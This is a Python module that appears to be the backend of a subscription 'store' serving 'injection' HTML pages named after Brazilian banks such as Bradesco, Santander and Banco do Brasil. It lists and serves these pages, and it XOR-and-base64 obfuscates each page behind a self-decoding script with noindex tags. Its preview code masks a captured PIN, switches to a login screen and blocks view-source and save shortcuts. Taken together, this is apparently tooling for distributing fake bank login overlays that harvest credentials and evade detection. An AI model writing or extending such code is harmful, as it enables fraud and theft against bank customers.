import base64
import json
import os
import re
import secrets

from config import Config

_PRODUCT_ID_RE = re.compile(r"^[a-zA-Z0-9_-]+$")
_OBF_SCRIPT_ID = "katana-html-obf"
_OBF_RE = re.compile(
    rf'<script\s+id="{_OBF_SCRIPT_ID}"[^>]*>.*?var\s+k=\[([0-9,\s]+)\];\s*'
    r'var\s+p=(?:\[([^\]]*)\]|"([^"]*)");.*?</script>',
    re.DOTALL,
)
_OBF_CHUNK_SIZE = 4096
_STORE_PRODUCT_ORDER = (
    "Bradesco",
    "Santander",
    "BancoDoBrasil",
    "FaceID",
    "BradescoAtualizacao",
)

def _product_sort_key(product):
    product_id = product.get("id") or ""
    try:
        return (0, _STORE_PRODUCT_ORDER.index(product_id))
    except ValueError:
        return (1, product_id.casefold())

def _compact_product_key(value):
    return re.sub(r"[\s_-]+", "", (value or "").casefold())

def _catalog_root():
    root = Config.STORE_CATALOG_DIR
    if not os.path.isdir(root):
        return None
    return root

def _resolve_catalog_dir(catalog_dir):
    if not catalog_dir:
        return None

    catalog_root = _catalog_root()
    if not catalog_root:
        return None

    exact = os.path.join(catalog_root, catalog_dir)
    if os.path.isdir(exact):
        return exact

    needle = catalog_dir.casefold()
    compact = _compact_product_key(catalog_dir)
    for entry in os.listdir(catalog_root):
        path = os.path.join(catalog_root, entry)
        if not os.path.isdir(path):
            continue
        if entry.casefold() == needle:
            return path
        if compact and _compact_product_key(entry) == compact:
            return path
    return None

def _load_meta(product_dir):
    meta_path = os.path.join(product_dir, "product.json")
    if not os.path.isfile(meta_path):
        return None
    with open(meta_path, encoding="utf-8") as handle:
        meta = json.load(handle)
    product_id = meta.get("id")
    if not product_id or not _PRODUCT_ID_RE.match(product_id):
        return None
    injection_path = os.path.join(product_dir, "injection.html")
    if not os.path.isfile(injection_path):
        return None
    tags = meta.get("tags") or []
    if isinstance(tags, str):
        tags = json.loads(tags)
    return {
        "id": product_id,
        "name": meta.get("name") or product_id,
        "bank": meta.get("bank") or "",
        "description": meta.get("description") or "",
        "tags": tags,
        "catalog_dir": os.path.basename(product_dir),
        "product_dir": product_dir,
        "injection_path": injection_path,
    }

def _meta_to_product(meta):
    product_id = meta["id"]
    return {
        "id": product_id,
        "name": meta["name"],
        "bank": meta["bank"],
        "description": meta["description"],
        "tags": meta["tags"],
        "catalog_dir": meta["catalog_dir"],
        "thumb_url": f"/subscriber/api/store/thumb/{product_id}",
        "download_url": f"/subscriber/api/store/download/{product_id}",
        "has_thumb": bool(get_thumb_path(product_id, meta["catalog_dir"])),
    }

def _iter_catalog_metas():
    catalog_root = _catalog_root()
    if not catalog_root:
        return []

    items = []
    for entry in os.listdir(catalog_root):
        product_dir = os.path.join(catalog_root, entry)
        if not os.path.isdir(product_dir) or entry.startswith("."):
            continue
        meta = _load_meta(product_dir)
        if meta:
            items.append(meta)
    return items

def _find_meta(product_id):
    if not _PRODUCT_ID_RE.match(product_id or ""):
        return None
    needle = product_id.casefold()
    for meta in _iter_catalog_metas():
        if meta["id"].casefold() == needle:
            return meta
    return None

def get_thumb_path(product_id, catalog_dir=None):
    if catalog_dir:
        product_dir = _resolve_catalog_dir(catalog_dir)
    else:
        meta = _find_meta(product_id)
        product_dir = meta["product_dir"] if meta else _resolve_catalog_dir(product_id)
    if not product_dir:
        return None
    thumb_path = os.path.join(product_dir, "thumb.png")
    if os.path.isfile(thumb_path):
        return thumb_path
    return None

def get_injection_path(product_id):
    meta = _find_meta(product_id)
    if not meta:
        return None
    path = meta["injection_path"]
    if os.path.isfile(path):
        return path
    return None

def _product_dir(product_id):
    meta = _find_meta(product_id)
    if meta:
        return meta["product_dir"]
    return _resolve_catalog_dir(product_id)

def list_products():
    products = [_meta_to_product(meta) for meta in _iter_catalog_metas()]
    products.sort(key=_product_sort_key)
    return products

def get_product(product_id):
    meta = _find_meta(product_id)
    if not meta:
        return None
    return _meta_to_product(meta)

def is_obfuscated_html(html):
    return f'id="{_OBF_SCRIPT_ID}"' in (html or "")

def obfuscate_html(html):
    key = list(secrets.token_bytes(16))
    raw = html.encode("utf-8")
    xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(raw))
    payload = base64.b64encode(xored).decode("ascii")
    chunks = [
        payload[i : i + _OBF_CHUNK_SIZE]
        for i in range(0, len(payload), _OBF_CHUNK_SIZE)
    ]
    chunks_js = ",".join(json.dumps(chunk) for chunk in chunks)
    key_js = ",".join(str(n) for n in key)
    return (
        "<!DOCTYPE html>\n"
        '<html lang="pt-BR">\n'
        "<head>\n"
        '  <meta charset="UTF-8" />\n'
        '  <meta name="robots" content="noindex,nofollow" />\n'
        "  <title></title>\n"
        "</head>\n"
        "<body>\n"
        f'<script id="{_OBF_SCRIPT_ID}">\n'
        "(function(d){\n"
        f"var k=[{key_js}];\n"
        f"var p=[{chunks_js}];\n"
        "var b=atob(p.join(\"\")),x=new Uint8Array(b.length);\n"
        "for(var i=0;i<b.length;i++)x[i]=b.charCodeAt(i)^k[i%k.length];\n"
        'd.open();d.write(new TextDecoder("utf-8").decode(x));d.close();\n'
        "})(document);\n"
        "</script>\n"
        "</body>\n"
        "</html>\n"
    )

def deobfuscate_html(html):
    if not is_obfuscated_html(html):
        return html

    match = _OBF_RE.search(html)
    if not match:
        raise ValueError("HTML ofuscado invalido")

    key = [int(part.strip()) for part in match.group(1).split(",") if part.strip()]
    if match.group(2) is not None:
        chunks = re.findall(r'"([^"]*)"', match.group(2))
        payload_b64 = "".join(chunks)
    else:
        payload_b64 = match.group(3) or ""

    xored = base64.b64decode(payload_b64)
    raw = bytes(b ^ key[i % len(key)] for i, b in enumerate(xored))
    return raw.decode("utf-8")

def build_preview_html(product_id, embed=False, stage="welcome"):
    product_dir = _product_dir(product_id)
    if not product_dir:
        return None

    injection_path = os.path.join(product_dir, "injection.html")
    if not os.path.isfile(injection_path):
        return None

    with open(injection_path, encoding="utf-8") as handle:
        html = handle.read()

    was_obfuscated = is_obfuscated_html(html)
    if was_obfuscated:
        html = deobfuscate_html(html)

    html = _ensure_preview_shell(html)
    html = _inject_preview_guard(html, embed=embed, stage=stage)
    if was_obfuscated:
        return obfuscate_html(html)
    return html

def _ensure_preview_shell(html):
    if re.search(r"""class=["']preview["']""", html):
        return html

    body_match = re.search(r"<body([^>]*)>", html, re.IGNORECASE)
    if not body_match:
        return html

    body_end = html.lower().rfind("</body>")
    if body_end < 0:
        return html

    body_attrs = body_match.group(1)
    inner = html[body_match.end() : body_end]
    shell = (
        f"<body{body_attrs}>"
        f'<div class="preview"><div class="device">{inner}</div></div>'
        f"{html[body_end:]}"
    )
    return html[: body_match.start()] + shell

def _inject_preview_guard(html, embed, stage):
    if not embed:
        html = html.replace("showAlert(pin);", "showAlert('••••');")
        html = html.replace("try { window.alert(msg); } catch (e) {}", "")

    mode = "embed" if embed else "modal"
    if stage not in ("welcome", "login", "full"):
        stage = "welcome"

    patch = f"""
<style id="katana-store-preview-guard">
  html, body {{
    margin: 0 !important;
    padding: 0 !important;
    width: 100% !important;
    height: 100% !important;
    overflow: hidden !important;
    background: #000 !important;
  }}
  .preview {{
    width: 100% !important;
    height: 100% !important;
    min-height: 100% !important;
    padding: 0 !important;
    margin: 0 !important;
    display: block !important;
    position: relative !important;
    overflow: hidden !important;
    box-sizing: border-box !important;
    background: #000 !important;
  }}
  #katana-device-fit {{
    position: absolute !important;
    top: 0 !important;
    left: 50% !important;
    overflow: hidden !important;
    transform: translateX(-50%) !important;
  }}
  .device {{
    width: 390px !important;
    height: 844px !important;
    min-height: 844px !important;
    max-height: none !important;
    max-width: none !important;
    border-radius: 0 !important;
    box-shadow: none !important;
    position: absolute !important;
    top: 0 !important;
    left: 0 !important;
    margin: 0 !important;
    transform-origin: 0 0 !important;
  }}
  @media (max-width: 480px) {{
    html, body, .preview {{
      width: 100% !important;
      height: 100% !important;
      min-height: 100% !important;
    }}
    .preview {{
      padding: 0 !important;
      display: block !important;
    }}
    .device {{
      width: 390px !important;
      height: 844px !important;
      max-height: none !important;
      border-radius: 0 !important;
    }}
  }}
  {'html, body { pointer-events: none !important; user-select: none !important; }' if embed else ''}
  body::after {{
    content: "PREVIEW KATANA";
    position: fixed;
    top: 12px;
    right: 12px;
    z-index: 99999;
    padding: 0.25rem 0.5rem;
    border: 1px solid rgba(255,255,255,0.25);
    border-radius: 4px;
    background: rgba(0,0,0,0.55);
    color: rgba(255,255,255,0.85);
    font: 600 10px/1 ui-monospace, monospace;
    letter-spacing: 0.12em;
    pointer-events: none;
  }}
</style>
<script id="katana-store-preview-guard">
(function () {{
  var stage = "{stage}";
  document.addEventListener("contextmenu", function (e) {{ e.preventDefault(); }}, true);
  document.addEventListener("keydown", function (e) {{
    if ((e.ctrlKey || e.metaKey) && ["s","u","p"].indexOf(String(e.key).toLowerCase()) >= 0) {{
      e.preventDefault();
    }}
  }}, true);
  function fitPreviewDevice() {{
    var w = window.innerWidth || document.documentElement.clientWidth;
    var h = window.innerHeight || document.documentElement.clientHeight;
    if (w < 8 || h < 8) {{
      window.requestAnimationFrame(fitPreviewDevice);
      return;
    }}

    var device = document.querySelector(".device");
    var preview = document.querySelector(".preview");
    if (!device || !preview) return;

    var scale = Math.min(w / 390, h / 844, 1);
    var fitW = 390 * scale;
    var fitH = 844 * scale;

    var fit = document.getElementById("katana-device-fit");
    if (!fit) {{
      fit = document.createElement("div");
      fit.id = "katana-device-fit";
      preview.insertBefore(fit, device);
      fit.appendChild(device);
    }}

    fit.style.width = fitW + "px";
    fit.style.height = fitH + "px";
    device.style.transform = "scale(" + scale + ")";
  }}

  function boot() {{
    fitPreviewDevice();
    window.addEventListener("resize", fitPreviewDevice);
    if (window.ResizeObserver) {{
      var ro = new ResizeObserver(fitPreviewDevice);
      ro.observe(document.documentElement);
    }}
    window.setTimeout(fitPreviewDevice, 60);
    window.setTimeout(fitPreviewDevice, 240);
    if (stage !== "login") return;
    var welcome = document.getElementById("screen-welcome");
    var login = document.getElementById("screen-login");
    if (!welcome || !login) return;
    welcome.classList.remove("is-active");
    login.classList.add("is-active");
  }}
  if (document.readyState === "loading") {{
    document.addEventListener("DOMContentLoaded", boot);
  }} else {{
    boot();
  }}
  window.addEventListener("load", fitPreviewDevice);
}})();
</script>
"""

    if "</head>" in html:
        return html.replace("</head>", patch + "</head>", 1)
    return patch + html
